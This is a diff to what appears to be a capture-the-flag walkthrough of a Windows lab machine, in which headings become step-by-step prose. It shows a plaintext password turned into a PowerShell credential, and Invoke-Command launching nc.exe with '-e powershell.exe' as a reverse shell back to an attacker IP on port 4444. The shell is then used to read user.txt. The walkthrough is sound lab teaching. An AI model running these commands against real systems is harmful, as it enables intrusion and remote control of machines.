@@ -362,19 +362,11 @@ hostname
 Fidelity
 ```
 
-#### Command Execution as hector
+To run a command as `hector`, we need to execute the following commands.<br>
+Running `whoami` shows that the command is executed as `control\hector`.
 ```shell
 PS C:\> $password = convertto-securestring -AsPlainText -Force -String "l33th4x0rhector"
 $password = convertto-securestring -AsPlainText -Force -String "l33th4x0rhector"
-PS C:\> $credential = New-Object -TypeName System.Management.Automation.PSCredential - ArgumentList "Fidelity\hector",$password
-$credential = New-Object -TypeName System.Management.Automation.PSCredential - ArgumentList "Fidelity\hector",$password
-New-Object : A positional parameter cannot be found that accepts argument 'ArgumentList'.
-At line:1 char:15
-+ ... redential = New-Object -TypeName System.Management.Automation.PSCrede ...
-+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : InvalidArgument: (:) [New-Object], ParameterBindingException
-    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell.Commands.NewObjectCommand
- 
 PS C:\> $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Fidelity\hector",$password
 $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Fidelity\hector",$password
 PS C:\> Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -Credential $credential
@@ -382,7 +374,8 @@ Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -Credential $cred
 control\hector
 ```
 
-#### Spawning shell as hector
+Then, achieve a reverse shell as `hector`.<br>
+Launch a netcat listener and run the following PowerShell command on the target machine.
 ```shell
 root@kali:~# nc -nlvp 4444
 listening on [any] 4444 ...
@@ -392,6 +385,8 @@ listening on [any] 4444 ...
 PS C:\> Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\inetpub\wwwroot\nc.exe 10.10.14.42 4444 -e powershell.exe } -Credential $credential
 ```
 
+Go back to the netcat listener window.<br>
+We can see that we got a shell as `control\hector`.
 ```shell
 root@kali:~# nc -nlvp 4444
 listening on [any] 4444 ...
@@ -404,6 +399,7 @@ whoami
 control\hector
 ```
 
+`user.txt` is in the folder `C:\Users\Hector\Desktop\`.
 ```shell
 PS C:\Users\Hector\Documents> cat C:\users\hector\Desktop\user.txt
 cat C:\users\hector\Desktop\user.txt
